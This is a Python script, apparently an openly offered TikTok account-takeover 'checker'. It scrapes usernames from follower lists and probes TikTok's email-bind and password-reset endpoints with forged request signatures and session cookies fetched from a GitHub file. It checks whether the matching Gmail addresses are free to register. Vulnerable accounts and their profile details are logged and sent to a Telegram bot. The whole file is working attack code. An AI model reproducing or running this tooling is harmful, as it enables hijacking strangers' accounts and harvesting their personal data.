import aiohttp, asyncio, uuid, random, os, sys, secrets, json, re, datetime, requests
from yarl import URL
import colorama
try:
    import SignerPy
except ImportError:
    os.system("pip install --upgrade pip")
    os.system("pip install SignerPy")
    import SignerPy
os.system('cls' if os.name == 'nt' else 'clear')
colorama.init(autoreset=True)

O = "\033[38;5;208m"
K = '\033[1;35;40m'
C = '\033[1;36;40m'
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
W = "\033[97m"
rest = "\033[0m"

Token = input(f'{O}※ {rest}TOKEN{C} ♪ {rest}TELE : \033[38;5;218m')
print("\r")
iD = input(f'{O}※ {rest}ID{C} ♪ {rest}TELE : \033[38;5;218m')
print("\r")
proxy = input(f'{O}※ {rest}PROXY{C} ♪ {rest}RESIDENTIAL : \033[38;5;218m')
print("\r")
sessions = []
os.system('cls' if os.name == 'nt' else 'clear')
try:
    requests.get(f"https://api.telegram.org/bot{Token}/forwardMessage?chat_id={iD}&from_chat_id=-1002582451818&message_id=22")
except Exception:
    pass
    
class Base:
    def __init__(self):
        self.good_tik = 0
        self.bad_tik = 0
        self.good_gm = 0
        self.bad_gm = 0
        self.retry = 0

async def github():
    global sessions
    url = "https://raw.githubusercontent.com/is-L7N/session_keys/refs/heads/main/session.txt"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as resp:
                text = await resp.text()
            sessions = text.splitlines()
        except Exception:
            pass

class Network:
    def __init__(self):
        global proxy
        if proxy and "@" in proxy:
        	self.proxy = {
    "http": "http://" + str(proxy),
    "https": "http://" + str(proxy),   
}
        else:
        	self.proxy = False or None
        self.hosts = [
            "api31-normal-useast2a.tiktokv.com",
            "api22-normal-c-alisg.tiktokv.com",
            "api2.musical.ly",
            "api16-normal-useast5.tiktokv.us",
            "api16-normal-no1a.tiktokv.eu",
            "rc-verification-sg.tiktokv.com",
            "api31-normal-alisg.tiktokv.com",
            "api16-normal-c-useast1a.tiktokv.com",
            "api22-normal-c-useast1a.tiktokv.com",
            "api16-normal-c-useast1a.musical.ly",
            "api19-normal-c-useast1a.musical.ly",
            "api.tiktokv.com",
            "www.tiktok.com",
            "log2.musical.ly",
            "webcast.musical.ly",
            "inapp.tiktokv.com",
            "api2-19-h2.musical.ly"
]
        
        self.send_hosts = [
        	"api22-normal-c-alisg.tiktokv.com",
        	"api31-normal-alisg.tiktokv.com",
        	"api22-normal-probe-useast2a.tiktokv.com",
        	"api16-normal-probe-useast2a.tiktokv.com",
        	"rc-verification-sg.tiktokv.com"
]
        self.params = {
            'device_platform': 'android',
            'ssmix': 'a',
            'channel': 'googleplay',
            'aid': '1233',
            'app_name': 'musical_ly',
            'version_code': '360505',
            'version_name': '36.5.5',
            'manifest_version_code': '2023605050',
            'update_version_code': '2023605050',
            'ab_version': '36.5.5',
            'os_version': '10',
            "device_id": 0000000000,
            'app_version': '30.1.2',
            "request_from": "profile_card_v2",
            "request_from_scene": '1',
            "scene": "1",
            "mix_mode": "1",
            "os_api": "34",
            "ac": "wifi",
            "request_tag_from": "h5",
        }        
        self.headers = {
            'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})'
        }
        self.payload = {                
            'count': "100",
            'source': "tt_ffp_add_friends",
            'mention_type': "0",
            }

class Email:
    def __init__(self):
        self.url = "https://api.mail.tm"
        self.headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
    async def gen(self):
        async with aiohttp.ClientSession(headers=self.headers) as session:
            try:
                async with session.get(f"{self.url}/domains") as resp:
                    data = await resp.json()
                    domain = data["hydra:member"][0]["domain"]

                mail = ''.join(random.choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(12)) + str("@") + str(domain)
                payload = {"address": mail, "password": mail}
                async with session.post(f"{self.url}/accounts", json=payload) as resp:
                    await resp.json()

                async with session.post(f"{self.url}/token", json=payload) as resp:
                    token = await resp.json()
                    return mail, token.get("token")

            except aiohttp.ContentTypeError:
                return "O"
            except Exception as e:
                print(e)
                return False, False

    async def mailbox(self, token: str):
        async with aiohttp.ClientSession(headers={**self.headers, "Authorization": f"Bearer {token}"}) as session:
            while True:
                await asyncio.sleep(5)
                try:
                    async with session.get(f"{self.url}/messages") as resp:
                        inbox = await resp.json()
                        messages = inbox.get("hydra:member", [])
                        if messages:
                            id = messages[0]["id"]
                            async with session.get(f"{self.url}/messages/{id}") as r:
                                msg = await r.json()
                                return msg.get("text", "")
                except aiohttp.ContentTypeError:
                    await asyncio.sleep(5)
                except Exception as e:
                    print(e)
                    return False
                    
class EmailTK(Base):
    def __init__(self, email: str):
        super().__init__()
        self.email = email + "@gmail.com"
        network = Network()
        self.params = network.params.copy()
        self.params.update({'device_type': f'rk{random.randint(3000, 4000)}s_{uuid.uuid4().hex[:4]}'})
        self.params = SignerPy.get(params=self.params)
        self.headers = network.headers.copy()
        self.cookies = {"sessionid": random.choice(sessions)}
        self.payload = {'email': self.email}

    async def check(self, ret=5):
        if "_" in self.email and len(self.email) <6:
            self.bad_tik +=1
        else:
            trys = 0
            while trys < ret:
                trys += 1
                try:
                    signature = SignerPy.sign(params=self.params, cookie=self.cookies, payload=self.payload)
                    self.headers.update({
                        'x-ss-req-ticket': signature['x-ss-req-ticket'],
                        'x-ss-stub': signature['x-ss-stub'],
                        'x-argus': signature['x-argus'],
                        'x-gorgon': signature['x-gorgon'],
                        'x-khronos': signature['x-khronos'],
                        'x-ladon': signature['x-ladon'],
                    })
    
                    url = 'https://' +str(random.choice(["inapp.tiktokv.com","api2.musical.ly","api16-normal-c-alisg.tiktokv.com","api2-19-h2.musical.ly"])) + '/passport/email/bind_without_verify/'
    
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, data=self.payload, headers=self.headers, params=self.params, cookies=self.cookies) as response:
                            text = await response.text()
                            if "Session expired" in text:
                                self.retry += 1
                                continue
                            elif "Account is already linked" in text:
                                self.bad_tik += 1
                                break
                            elif "Email is linked to another account. Unlink or try another email." in text:
                                self.good_tik += 1
                                self.gm_checker = Gm(email=self.email)
                                await self.gm_checker.check()
                                break
                            else:
                                self.retry += 1
                                continue
                    break
                except Exception as e:
                    self.retry += 1
                    continue

class Gm(Base):
    def __init__(self, email: str) -> None:
        super().__init__()
        self.email = email.split("@")[0] if "@" in email else email
        self.TL = None
        self.__Host_GAPS = None
        self.base_url = 'https://accounts.google.com/_/signup'
        self.headers = {
            'user-agent': "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36",
            'google-accounts-xsrf': '1',
        }
    async def check(self):
        if "_" in self.email and len(self.email) <6:
            self.bad_gm +=1
        else:
            try:
                url = self.base_url + '/validatepersonaldetails'
                params = {'hl': "ar", '_reqid': "74404", 'rt': "j"}
                payload = {
                    'f.req': "[\"AEThLlymT9V_0eW9Zw42mUXBqA3s9U9ljzwK7Jia8M4qy_5H3vwDL4GhSJXkUXTnPL_roS69KYSkaVJLdkmOC6bPDO0jy5qaBZR0nGnsWOb1bhxEY_YOrhedYnF3CldZzhireOeUd-vT8WbFd7SXxfhuWiGNtuPBrMKSLuMomStQkZieaIHlfdka8G45OmseoCfbsvWmoc7U\",\"L7N\",\"ToPython\",\"L7N\",\"ToPython\",0,0,null,null,null,0,null,1,[],1]",
                    'deviceinfo': "[null,null,null,null,null,\"IQ\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,1,1,2]",
                }
                __Host_GAPS = ''.join(secrets.choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(secrets.randbelow(16)+15))
                cookies = {'__Host-GAPS': __Host_GAPS}
    
                async with aiohttp.ClientSession(headers=self.headers, cookies=cookies) as session:
                    async with session.post(url, params=params, data=payload, timeout=10) as response:
                        if response.status != 200: return None
                        text = await response.text()
                        if '",null,"' not in text: return None
                        self.TL = text.split('",null,"')[1].split('"')[0]
                        self.__Host_GAPS = session.cookie_jar.filter_cookies(URL(url)).get("__Host-GAPS")
                        if self.__Host_GAPS: self.__Host_GAPS = self.__Host_GAPS.value
                url = self.base_url + '/usernameavailability'
                cookies = {'__Host-GAPS': self.__Host_GAPS}
                params = {'TL': self.TL}
                data = {
                    'continue': 'https://mail.google.com/mail/u/0/',
                    'ddm': '0',
                    'flowEntry': 'SignUp',
                    'service': 'mail',
                    'theme': 'mn',
                    'f.req': f'["TL:{self.TL}","{self.email}",0,0,1,null,0,5167]',
                    'azt': 'AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig:1712322460888',
                    'cookiesDisabled': 'false',
                    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                    'gmscoreversion': 'undefined',
                    'flowName': 'GlifWebSignIn'
                }
                async with aiohttp.ClientSession(headers=self.headers, cookies=cookies) as session:
                    try:
                        async with session.post(url, params=params, data=data, timeout=10) as response:
                            if response.status == 200:
                                text = await response.text()
                                if '"gf.uar",1' in text:                                    
                                    user = Info(self.email)
                                    a = await user.email2user()
                                    if a != "badinfo":
                                        self.good_gm += 1
                                    else:
                                        self.bad_gm += 1
                                else:
                                    self.bad_gm += 1
                            else:
                                self.retry += 1
                    except Exception as e:
                        print(e)
                        self.retry += 1
                        await Gm(email=self.email).check()
            except Exception as e:
                print(e)
                self.retry += 1
                await Gm(email=self.email).check()

class Email2User:
    def __init__(self, email: str) -> None:
        self.email = email
        self.fake = None
        self.session = requests.Session()
        network = Network()
        self.proxy = network.proxy
        print(self.proxy)
        self.hosts = network.hosts
        self.send_hosts = network.send_hosts
        self.headers = network.headers.copy()
        self.params = network.params.copy()
        self.params = SignerPy.get(params=self.params)
        self.params.update({
            'device_type': f'rk{random.randint(3000, 4000)}s_{uuid.uuid4().hex[:4]}',
            'language': 'AR'
        })
        

    async def fak(self):
        for _ in range(5):
            self.fake = await Email().gen()
            if self.fake:
                return self.fake

    async def send_code(self):
        self.ticket = None
        
        for host in self.hosts:
            if self.proxy:
            	self.session.proxies.update(self.proxy)
            self.params["account_param"] = self.email
            signature = SignerPy.sign(params=self.params)
            headers2 = self.headers.copy()
            headers2.update({
                'x-tt-passport-csrf-token': secrets.token_hex(16),
                'x-ss-req-ticket': signature['x-ss-req-ticket'],
                'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature['x-argus'],
                'x-gorgon': signature['x-gorgon'],
                'x-khronos': signature['x-khronos'],
                'x-ladon': signature['x-ladon'],
            })
            url = f'https://{host}/passport/account_lookup/email/'
            try:
                response = await asyncio.to_thread(self.session.post, url, params=self.params, headers=headers2, timeout=10)
                #print(f"{G}{response.text}{rest}")
                self.ticket = response.json()['data']['accounts'][0]['passport_ticket']
                if self.ticket:
                    break 
            except Exception as e:
                print(e)
                continue

        if not self.ticket:
            return False

        for host in self.send_hosts:
            if self.proxy:
            	self.session.proxies.update(self.proxy)
            self.params["not_login_ticket"] = self.ticket
            self.params["email"], self.token = self.fake
            self.params["type"] = "3737"
            self.params.pop("fixed_mix_mode", None)
            self.params.pop("account_param", None)
            signature = SignerPy.sign(params=self.params)
            headers = self.headers.copy()
            headers.update({
                'x-ss-req-ticket': signature['x-ss-req-ticket'],
                'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature['x-argus'],
                'x-gorgon': signature['x-gorgon'],
                'x-khronos': signature['x-khronos'],
                'x-ladon': signature['x-ladon'],
            })
            url = f"https://{host}/passport/email/send_code"
            try:
                response = await asyncio.to_thread(self.session.post, url, params=self.params, headers=headers, timeout=10)
                #print(response.text)
                if response.json().get("message") == "success":
                    while True:
                        username = await self.box()
                        if username:
                            return username
                        await asyncio.sleep(2)
            except Exception as e:
                print(str(e))
                continue

        return False

    async def box(self):
        try:
            response = await Email().mailbox(self.token)
            if response:
                ree = re.search(r'تم إنشاء هذا البريد الإلكتروني من أجل\s+(.+)\.', response)
                if ree:
                    username = ree.group(1)                  
                    return username
        except Exception as e:
            print(R+e)
            return False

class Info:
    def __init__(self, username: str) -> None:
        self.email = username + str("@gmail.com")
        network = Network()
        self.headers = network.headers.copy()
        self.params = network.params.copy()
    async def email2user(self):
        api = Email2User(email=self.email)
        
        for _ in range(5):
            await api.fak()
            if api.fake:
                #print(api.fake)
                break
        
        try:
            self.username = await api.send_code()
            if not self.username:
                return "badinfo"               
            info = await self.account()
            if info == "zrba":
                return "badinfo"
        except Exception as e:
            print(str(e))
            return "badinfo"
               
    async def account(self):
        url = f"https://www.tiktok.com/@{self.username}"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, headers=self.headers) as r:
                    response = await r.text()
            m = re.search(r'({"__DEFAULT_SCOPE__":.*})</script>', response)
            if not m:
                return {"error":"no user data"}  
            d = json.loads(m.group(1))["__DEFAULT_SCOPE__"]["webapp.user-detail"]["userInfo"]
            u, st = d["user"], d["stats"]
            id = u.get('id','')
            region = u.get('region','')
            level = await self.get_level(id=id)           
            flag = chr(ord(region[0].upper()) + 127397) + chr(ord(region[1].upper()) + 127397)
            date = datetime.datetime.utcfromtimestamp(u.get("createTime","")).strftime("%Y/%m/%d")
            info = {
                "username": self.username,
                "name": u.get("nickname",""),
                "id": id,
                "followers": st.get("followerCount",""),
                "following": st.get("followingCount",""),
                "likes": st.get("heartCount",""),
                "videos": st.get("videoCount",""),
                "created": date,
                "level": level,
                'region': region,
                'privateAccount': st.get('privateAccount',''),
                'avatarLarger' : u.get('avatarMedium','')
            }
            
            #if int(info['followers'] < 900):
#                level = level.split("Lv.")[-1]
#                if int(level) < 1:
#                	return "zrba"
            send = f"""
━━━━━━━━━━━━━━━━━━━
※ Username : @{info.get('username', 'N/A')}
※ Email : {getattr(self, 'email', 'N/A')}
※ Name : {info.get('name', 'N/A')}
※ ID : {info.get('id', 'N/A')}
━━━━━━━━━━━━━━━━━━━
※ Followers : {info.get('followers', 'N/A')}
※ Following : {info.get('following', 'N/A')}
※ Likes : {info.get('likes', 'N/A')}
※ Videos : {info.get('videos', 'N/A')}
━━━━━━━━━━━━━━━━━━━
※ Created : {info.get('created', 'N/A')}
※ Level : {info.get('level', 'N/A')}
※ Flag : {flag if 'flag' in locals() else 'N/A'}
━━━━━━━━━━━━━━━━━━━
※ By : @PyLast 🐉
"""
            with open("L7N_HIT", "a", encoding="utf-8") as f:
            	f.write(send + "\n" )
            print(G+send)
            try:
                async with aiohttp.ClientSession() as s:
                    await s.post(f"https://api.telegram.org/bot{Token}/sendPhoto?",params={
                    "chat_id": iD,
                    "photo": info['avatarLarger'],
                    "caption": send
                })
            except Exception:
                url = f"https://api.telegram.org/bot{Token}/sendMessage"
                async with aiohttp.ClientSession() as s:
                    async with s.post(url, params={
                        "chat_id": iD,
                        "text": send
                    }) as resp:
                        await resp.text()
        except Exception as e:
            print(e)
            return {}
    async def get_level(self, id: str):
        url = "https://webcast16-normal-no1a.tiktokv.eu/webcast/user/"
        self.params.update({
        "request_from": "profile_card_v2",
        "request_from_scene": '1',
        "target_uid": id,
        "device_type": "RMX3511",
        "webcast_sdk_version": "2920",
    })

        self.params.update(SignerPy.get(params=self.params))
        signature = SignerPy.sign(params=self.params)

        self.headers.update({
            'x-ss-req-ticket': signature['x-ss-req-ticket'],
            'x-ss-stub': signature['x-ss-stub'],
            'x-argus': signature["x-argus"],
            'x-gorgon': signature["x-gorgon"],
            'x-khronos': signature["x-khronos"],
            'x-ladon': signature["x-ladon"],
    })

        async with aiohttp.ClientSession(headers=self.headers) as session:
            async with session.get(url, params=self.params) as response:
                text = await response.text()            
                try:
                    return re.search(r'"default_pattern":"(.*?)"', text).group(1).split('level')[0]
                    
                except Exception as e:
                    print(e)
                    return 'hidden'

class Sys(Base):
    def __init__(self, file="List(L7N).txt"):
        super().__init__()
        if os.path.exists(file):
            with open(file, "r", encoding="utf-8", errors="ignore") as f:
                self.usernames = [line.strip() for line in f if line.strip()]
        else:
            self.usernames = []

    async def run(self):
        if not self.usernames:
            print(f"{R} * {rest}You Dont Have List !")
            return

        sem = asyncio.Semaphore(15)

        async def worker(user):
            async with sem:
                checker = EmailTK(user)
                await checker.check()

                self.good_tik += checker.good_tik
                self.bad_tik += checker.bad_tik
                self.retry   += checker.retry
                if hasattr(checker, "gm_checker"):
                    self.good_gm += checker.gm_checker.good_gm
                    self.bad_gm  += checker.gm_checker.bad_gm
                    self.retry   += checker.gm_checker.retry

                sys.stdout.write(f"""
\033[2J\033[H{Y}⚡ Checking Accounts{rest}
 ├ Good Gmail    : {G}{self.good_gm}{rest}
 ├ Bad TikTok    : {R}{self.bad_tik}{rest}
 ├ Good TikTok   : {C}{self.good_tik}{rest}
 ├ Bad Gmail     : {R}{self.bad_gm}{rest}
 ├ Retry         : {Y}{self.retry}{rest}
 ├ Email Now     : {O}{user}@gmail.com{rest}
""")
                sys.stdout.flush()

        tasks = [worker(user) for user in self.usernames]
        await asyncio.gather(*tasks)
        
class UserNames:
    def __init__(self):
        network = Network()
        self.params = network.params.copy()
        self.headers = network.headers.copy()
        self.payload = network.payload.copy()
        self.params.update(SignerPy.get(params=self.params))
        self.payload.update({'keyword': self.rand()})

    def rand(self) -> str:
	    lang = random.choice([
    "ابتثجحخدذرزسشصضطظعغفقكلمنهوي",  
    "ሀሁሂሃሄህሆለሉሊላሌልሎሏ",
    "߀߁߂߃߄߅߆߇߈߉ߊߋߌߍߎߏ" 
'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',  
            '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
            'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
            'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
            'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
            'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
            'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
      ]) 
	    return ''.join(random.choice(lang) for _ in range(random.randint(4,8)))

    async def search(self, session: aiohttp.ClientSession) -> list:
        url = "https://search16-normal-c-alisg.tiktokv.com/aweme/v1/search/user/sug/"
        self.headers.update(SignerPy.sign(params=self.params, payload=self.payload))
        try:
            async with session.post(url, params=self.params, data=self.payload, headers=self.headers) as r:
                res = await r.json()
                return [
                    su["extra_info"]["sug_uniq_id"]
                    for su in res.get("sug_list", [])
                    if "extra_info" in su and re.fullmatch(r"[A-Za-z0-9_]+", su["extra_info"].get("sug_uniq_id",""))
                ]
        except Exception:
            return []

class List:
    def __init__(self, username):
        self.username = username
        network = Network()
        self.params = network.params.copy()
        self.headers = network.headers.copy()
        self.url = "https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/"
        self.ks, self.total, self.user_id = 0, 0, ""

    async def infos(self, session: aiohttp.ClientSession) -> bool:
        try:
            async with session.get(f"https://www.tiktok.com/@{self.username}", headers=self.headers) as r:
                response = await r.text()
            m = re.search(r'({"__DEFAULT_SCOPE__":.*})</script>', response)
            if not m: return False
            d = json.loads(m.group(1))["__DEFAULT_SCOPE__"]["webapp.user-detail"]["userInfo"]
            self.user_id = d["user"].get("id","")
            self.total = d["stats"].get("followerCount",0) + d["stats"].get("followingCount",0)
            return True
        except:
            return False

    async def follow(self, session: aiohttp.ClientSession) -> set:
        if not await self.infos(session): 
            self.ks += 1
            return set()
        users = set()
        try:
            url1 = self.url + "follower/list/"
            url2 = self.url + "following/list/"
            params = self.params.copy(); params.update({"user_id": self.user_id,"count":"100"})
            headers = self.headers.copy()
            sig = await asyncio.to_thread(SignerPy.sign, params)
            headers.update(sig)
            async with session.get(url1, headers=headers, params=params) as r:
                text = await r.text()
                users.update(re.findall(r'"unique_id"\s*:\s*"([^"]+)"', text))
            async with session.get(url2, headers=headers, params=params) as r:
                text = await r.text()
                users.update(re.findall(r'"unique_id"\s*:\s*"([^"]+)"', text))
        except Exception:
            self.ks += 1
        return users

class Run2:
    def __init__(self):
        self.usernames = set()
        self.fail = 0
        self.total = 10000

    async def worker(self, session):
        while len(self.usernames) < self.total:
            users = await UserNames().search(session)
            if not users: 
                self.fail += 1
                continue
            tasks = [self.rn(session, user) for user in users]
            await asyncio.gather(*tasks)

    async def rn(self, session, user):
        listk = List(user)
        users = await listk.follow(session)
        self.fail += listk.ks
        wuser = users - self.usernames
        self.usernames.update(wuser)
        if wuser:
            with open("List(L7N).txt", "a", encoding="utf-8") as f:
                for u in wuser:
                    f.write(u + "\n")
        self.usernames.update(users)
        self.Sys(user)

    def Sys(self, user):
        rem = max(self.total - len(self.usernames), 0)
        sys.stdout.write(f"""
\033[2J\033[H
{Y}⚡ Collecting TikTok Users{rest}
 ├ Total Needed : {C}{self.total}{rest}
 ├ Total UserNames : {G}{len(self.usernames)}{rest}
 ├ Remaining : {C}{rem}{rest}
 ├ Fail Attempts : {R}{self.fail}{rest}
 ├ UserName Now : {O}{user}{rest}
""")
        sys.stdout.flush()

    async def run(self):
        async with aiohttp.ClientSession() as session:
            await self.worker(session)


class List_:
    def __init__(self):
        self.username = input(f"\n{O} ※{rest} UserName To Get List : {rest}")
        try:
            network = Network()
            self.params = network.params.copy()
            self.headers = network.headers.copy()
        except Exception:
            print("Expectations: Failed to init Network")
            self.params, self.headers = {}, {}

        self.url = "https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/"
        self.ks = 0
        self.total = 0
        self.user_id = "" 

    def Sys(self, usernames, rem, username_now, mode="Followers"):
        sys.stdout.write(f"""
\033[2J\033[H
{Y}⚡ Collecting {mode}{rest}
 ├ Total Needed : {C}{self.total}{rest}
 ├ Total UserNames : {G}{len(usernames)}{rest}
 ├ Remaining : {C}{rem}{rest}
 ├ Fail Attempts : {R}{self.ks}{rest}
 ├ UserName Now : {O}{username_now}{rest}
""")
        sys.stdout.flush()

    async def infos(self, session):
        url = f"https://www.tiktok.com/@{self.username}"
        try:
            async with session.get(url, headers=self.headers) as r:
                response = await r.text()
            m = re.search(r'({"__DEFAULT_SCOPE__":.*})</script>', response)
            if not m:
                return {"error": "no user data"}
            d = json.loads(m.group(1))["__DEFAULT_SCOPE__"]["webapp.user-detail"]["userInfo"]
            u, st = d["user"], d["stats"]
            return {
                "user_id": u.get('id',''),
                "followers": st.get("followerCount",0),
                "following": st.get("followingCount",0)}
        except Exception:
            return False

    async def List(self, session, url, usernames, page_token=""):
        try:
            params = self.params.copy()
            params.update({"user_id": self.user_id, "count": "100", "page_token": page_token})
            signature = await asyncio.to_thread(SignerPy.sign, params)

            headers = self.headers.copy()
            headers.update({
                'x-ss-req-ticket': signature['x-ss-req-ticket'],
                'x-ss-stub': signature['x-ss-stub'],
                'x-argus': signature['x-argus'],
                'x-gorgon': signature['x-gorgon'],
                'x-khronos': signature['x-khronos'],
                'x-ladon': signature['x-ladon'],
            })

            async with session.get(url, headers=headers, params=params) as resp:
                text = await resp.text()
                users = re.findall(r'"unique_id"\s*:\s*"([^"]+)"', text)
                usernames.update(users)
                token = re.search(r'"next_page_token"\s*:\s*"([^"]*)"', text)
                return token.group(1) if token else ""
        except Exception:
            return False

    async def run(self, mode="Followers"):
        try:
            async with aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(limit=50, force_close=False)
            ) as session:
                info = await self.infos(session)
                if not info or "error" in info:
                    return

                self.user_id = info.get("user_id","")
                self.total = info.get("followers" if mode=="Followers" else "following", 0)

                url = self.url + ("follower/list/" if mode=="Followers" else "following/list/")
                users, tokens, token = set(), set(), ""

                while True:
                    token = await self.List(session, url, users, token)
                    if not token or token in tokens:
                        break
                    tokens.add(token)
                    rem = self.total - len(users)
                    self.Sys(users, rem, list(users)[-1], mode)

            with open("List(L7N).txt", "w", encoding="utf-8") as f:
                f.writelines(user + "\n" for user in users)

            print(f"\n{G} ※{rest} Done Save : {O}{len(users)}{rest}")
        except Exception:
            pass       


class Home:
    def run(self):        
        print(f"""├ Welcome to TikTok ※ Checker Tool
├ Author     : {C}@asyncL7N{rest}
├ GitHub     : {G}https://github.com/is-L7N{rest}
├ My Username: {O}@PyLast{rest}
\n""")

        print(f"""
├ 1) Run Checker    : {C}Enter the checker{rest}
├ 2) List Random    : \033[38;5;218mGeneration list From {O}Followers {rest}and{O} Following{rest}
├ 3) List Followers : {G}Generation list From Followers{rest}
├ 4) List Following : \033[38;5;200mGeneration list From Following{rest}
├ 5) Delete List    : {O}Remove old List{rest}
├ 6) Information    : {Y}Tool details and author info{rest}
""")
        choice = input(f"{O} ※ {rest}Choice Number : ")
        if choice == "1":
            print(f"\n{C}※ {rest}Running the checker...\n")
            asyncio.run(github())            
            checker = Sys()
            asyncio.run(checker.run())
        elif choice == "2":
        	asyncio.run(Run2().run())
        elif choice == "3":
            asyncio.run(List_().run(mode="Followers"))
        elif choice == "4":
            asyncio.run(List_().run(mode="Following"))
        elif choice == "5":
            print(f"\n{Y} ※ {rest}Deleting old list...\n")
            if os.path.exists("List(L7N).txt"):
                os.remove("List(L7N).txt")
            print(f"{G} ※ {rest}Done Delete Old List ✓")
        elif choice == "6":
            print(f"\n{C} * {rest}TikTok tool checks TikTok accounts linked to available emails that can be taken a simple tool for you.Tool programmer: {O}L7N{rest}")
        else:
            print(f"\n{R} ※ {rest} select 1-4")

if __name__ == "__main__":
    Home().run()